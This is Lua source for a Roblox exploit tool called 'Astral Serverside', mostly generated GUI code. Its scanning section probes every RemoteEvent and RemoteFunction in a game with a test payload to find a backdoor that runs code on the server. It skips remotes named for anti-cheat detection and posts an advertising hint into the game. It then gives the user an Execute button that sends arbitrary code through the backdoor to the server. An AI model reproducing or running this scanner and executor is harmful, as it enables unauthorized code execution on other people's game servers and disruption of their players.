-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow
ASTRAL["32"] = Instance.new("Frame", ASTRAL["30"]);
ASTRAL["32"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["32"]["Name"] = [[Arrow]];
ASTRAL["32"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["33"] = Instance.new("Frame", ASTRAL["32"]);
ASTRAL["33"]["BorderSizePixel"] = 0;
ASTRAL["33"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["33"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["33"]["Position"] = UDim2.new(0, 10, 0, 8);
ASTRAL["33"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["34"] = Instance.new("Frame", ASTRAL["32"]);
ASTRAL["34"]["BorderSizePixel"] = 0;
ASTRAL["34"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["34"]["Size"] = UDim2.new(0, 1, 0, 3);
ASTRAL["34"]["Position"] = UDim2.new(0, 9, 0, 7);
ASTRAL["34"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["35"] = Instance.new("Frame", ASTRAL["32"]);
ASTRAL["35"]["BorderSizePixel"] = 0;
ASTRAL["35"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["35"]["Size"] = UDim2.new(0, 1, 0, 5);
ASTRAL["35"]["Position"] = UDim2.new(0, 8, 0, 6);
ASTRAL["35"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["36"] = Instance.new("Frame", ASTRAL["32"]);
ASTRAL["36"]["BorderSizePixel"] = 0;
ASTRAL["36"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["36"]["Size"] = UDim2.new(0, 1, 0, 7);
ASTRAL["36"]["Position"] = UDim2.new(0, 7, 0, 5);
ASTRAL["36"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Ground
ASTRAL["37"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["37"]["Visible"] = false;
ASTRAL["37"]["ZIndex"] = 2;
ASTRAL["37"]["BorderSizePixel"] = 0;
ASTRAL["37"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["37"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["37"]["Position"] = UDim2.new(1, -17, 1, -17);
ASTRAL["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["37"]["Name"] = [[Ground]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Bar
ASTRAL["38"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["38"]["Visible"] = false;
ASTRAL["38"]["ZIndex"] = 2;
ASTRAL["38"]["BorderSizePixel"] = 0;
ASTRAL["38"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
ASTRAL["38"]["Size"] = UDim2.new(0, 17, 1, -17);
ASTRAL["38"]["Position"] = UDim2.new(1, -17, 0, 0);
ASTRAL["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["38"]["Name"] = [[Y_Bar]];
ASTRAL["38"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Bar
ASTRAL["39"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["39"]["Visible"] = false;
ASTRAL["39"]["ZIndex"] = 2;
ASTRAL["39"]["BorderSizePixel"] = 0;
ASTRAL["39"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
ASTRAL["39"]["Size"] = UDim2.new(1, -17, 0, 17);
ASTRAL["39"]["Position"] = UDim2.new(0, 0, 1, -17);
ASTRAL["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["39"]["Name"] = [[X_Bar]];
ASTRAL["39"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border
ASTRAL["3a"] = Instance.new("UIStroke", ASTRAL["f"]);
ASTRAL["3a"]["Name"] = [[Border]];
ASTRAL["3a"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow
ASTRAL["3b"] = Instance.new("UIGradient", ASTRAL["3a"]);
ASTRAL["3b"]["Name"] = [[Rainbow]];
ASTRAL["3b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
ASTRAL["3c"] = Instance.new("LocalScript", ASTRAL["3b"]);
ASTRAL["3c"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Corner
ASTRAL["3d"] = Instance.new("UICorner", ASTRAL["f"]);
ASTRAL["3d"]["Name"] = [[Corner]];
ASTRAL["3d"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Title
ASTRAL["3e"] = Instance.new("TextLabel", ASTRAL["d"]);
ASTRAL["3e"]["TextWrapped"] = true;
ASTRAL["3e"]["TextStrokeTransparency"] = 0;
ASTRAL["3e"]["BorderSizePixel"] = 0;
ASTRAL["3e"]["TextSize"] = 14;
ASTRAL["3e"]["TextScaled"] = true;
ASTRAL["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["3e"]["BackgroundTransparency"] = 1;
ASTRAL["3e"]["Size"] = UDim2.new(1, 0, 0, 32);
ASTRAL["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["3e"]["Text"] = [[Astral Serverside]];
ASTRAL["3e"]["Name"] = [[Title]];
ASTRAL["3e"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute
ASTRAL["3f"] = Instance.new("TextButton", ASTRAL["d"]);
ASTRAL["3f"]["TextStrokeTransparency"] = 0;
ASTRAL["3f"]["BorderSizePixel"] = 0;
ASTRAL["3f"]["TextSize"] = 24;
ASTRAL["3f"]["AutoButtonColor"] = false;
ASTRAL["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["3f"]["AnchorPoint"] = Vector2.new(0.5, 0);
ASTRAL["3f"]["BackgroundTransparency"] = 1;
ASTRAL["3f"]["Size"] = UDim2.new(1, -50, 0, 30);
ASTRAL["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["3f"]["Text"] = [[Execute]];
ASTRAL["3f"]["Name"] = [[Execute]];
ASTRAL["3f"]["Position"] = UDim2.new(0.5, 0, 0, 235);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border
ASTRAL["40"] = Instance.new("UIStroke", ASTRAL["3f"]);
ASTRAL["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
ASTRAL["40"]["Name"] = [[Border]];
ASTRAL["40"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow
ASTRAL["41"] = Instance.new("UIGradient", ASTRAL["40"]);
ASTRAL["41"]["Name"] = [[Rainbow]];
ASTRAL["41"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
ASTRAL["42"] = Instance.new("LocalScript", ASTRAL["41"]);
ASTRAL["42"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Corner
ASTRAL["43"] = Instance.new("UICorner", ASTRAL["3f"]);
ASTRAL["43"]["Name"] = [[Corner]];
ASTRAL["43"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
local function C_6()
local script = ASTRAL["6"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_6);
-- StarterGui.Astral Serverside.MainFrame.Drag
local function C_7()
local script = ASTRAL["7"];
	local dragging, dragstart, startpos
	script.Parent.InputBegan:Connect(function(input)
		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
			dragging, dragstart, startpos = true, input.Position, script.Parent.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
			local delta = input.Position - dragstart
			script.Parent.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
		end
	end)
end;
task.spawn(C_7);
-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
local function C_c()
local script = ASTRAL["c"];
	--= Info =--
	local mainframe = script.Parent
	local scanningframe = mainframe:WaitForChild("ScanningFrame",3)
	local executionframe = mainframe:WaitForChild("ExecutionFrame",3)
	
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local vulnremote: RemoteEvent | RemoteFunction = nil
	local backdoored: boolean = false
	local credithint: boolean = true -- Just to give me credit for making Astral :3
	
	--= Setup =--
	scanningframe.Visible = true
	scanningframe.Position = UDim2.new(0,0,0,0)
	executionframe.Visible = false
	executionframe.Position = UDim2.new(-1,0,0,0)
	
	--= Functions =--
	local function notify(desc, duration)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Astral Serverside",
				Text = tostring(desc),
				Duration = duration or 3
			})
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://17582299860"
			sound.Volume = 1
			sound.PlayOnRemove = true
			sound:Destroy()
		end)
	end
	
	local function fire(rem,code)
		if not rem then return end
		pcall(function()
			if rem:IsA("RemoteEvent") then
				rem:FireServer(code)
			elseif rem:IsA("RemoteFunction") then
				rem:InvokeServer(code)
			end
		end)
	end
	
	local function checkremote(remote: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return true
			end
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
			return true
		end
		if remote.Parent.Parent then
			if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
				return true
			end
			if remote.Parent.Name == "RobloxReplicatedStorage" 
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	--= Pre-scanning Variables =--
	local testpartname: string = "starlightreborn_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	--= Scanning =--
	local timer: number = 0
	coroutine.wrap(function()
		repeat
			timer += 0.001
			task.wait(0.01)
		until backdoored
	end)()
	
	local function checkpayload(remote: RemoteEvent | RemoteFunction)
		fire(remote,payload)
		for i = 1,320 do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.001)
		end
		return false
	end
	
	for _, remote: RemoteEvent | RemoteFunction in ipairs(game:GetDescendants()) do
		if remote.Parent == nil then return end
	
		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
			if checkremote(remote) then
				continue
			else
				notify("Testing: "..remote.Name)
				if checkpayload(remote) then
					backdoored = true
					vulnremote = remote
					fire(vulnremote,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
					break
				end
			end
		end
	end
	
	if backdoored and vulnremote then
		if credithint then fire(vulnremote,[[Instance.new("Hint",workspace).Text="This game was backdoored with: Astral SS  |  Join StrawberryCMD .gg/bXQfb3QWa8"]]) end
		notify("Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer))
		scanningframe:FindFirstChild("Description").Text = "Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer).."\nLoading execution panel..."
		coroutine.wrap(function()
			task.wait(1)
			executionframe.Visible = true
			scanningframe:TweenPosition(UDim2.new(1,0,0,0),"In","Back",1,false)
			executionframe:TweenPosition(UDim2.new(0,0,0,0),"In","Back",1,false)
			wait(1)
			scanningframe.Visible = false
		end)()
	else
		notify("No backdoors found! \n Exiting script safely...")
		scanningframe:FindFirstChild("Description").Text = "No backdoors found! \n Exiting script safely..."
		task.wait(0.5)
		mainframe.Parent:Destroy()
		return
	end
	
	--= Button Function(s) =--
	executionframe.Execute.MouseButton1Click:Connect(function()
		if not backdoored then return end
		local code = executionframe.FastColoredTextbox.Scroll.TextBox.Text
		fire(vulnremote,code)
	end)
end;
task.spawn(C_c);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
local function C_1a()
local script = ASTRAL["1a"];
	--# FastColoredTextBox v3 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y)
	end
	
	--textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize) --- MOVED THIS CODE TO LINE 257 OR SOMEWHERE NEAR THAT
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 17, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 17, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
	
	--# Scrollbar Buttons (7/7)
	local ground = script.Parent.Ground
	
	local buttons = {
		y = {
			top = script.Parent.Y_Top,
			btm = script.Parent.Y_Btm,
		},
		x = {
			lft = script.Parent.X_Lft,
			rght = script.Parent.X_Rght,
		}
	}
	
	local bars = {
		y = script.Parent.Y_Bar,
		x = script.Parent.X_Bar,
	}
	
	buttons.y.top.Visible = false
	buttons.y.btm.Visible = false
	buttons.x.rght.Visible = false
	buttons.x.lft.Visible = false
	ground.Visible = false
	
	fctbelements.textbox:GetPropertyChangedSignal("Text"):Connect(function()
		updatecanvassize()
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) then
			buttons.y.top.Visible = true
			buttons.y.btm.Visible = true
			--bars.y.Visible = true
		else
			buttons.y.top.Visible = false
			buttons.y.btm.Visible = false
			--bars.y.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.x.lft.Visible = true
			buttons.x.rght.Visible = true
			--bars.x.Visible = true
		else
			buttons.x.lft.Visible = false
			buttons.x.rght.Visible = false
			--bars.x.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) and fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -34)
			buttons.x.rght.Position = UDim2.new(1, -34, 1, -17)
			ground.Visible = true
		else
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -17)
			buttons.x.rght.Position = UDim2.new(1, -18, 1, -17)
			ground.Visible = false
		end
	end)
end;
task.spawn(C_1a);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
local function C_3c()
local script = ASTRAL["3c"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_3c);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
local function C_42()
local script = ASTRAL["42"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_42);

return ASTRAL["1"], require;
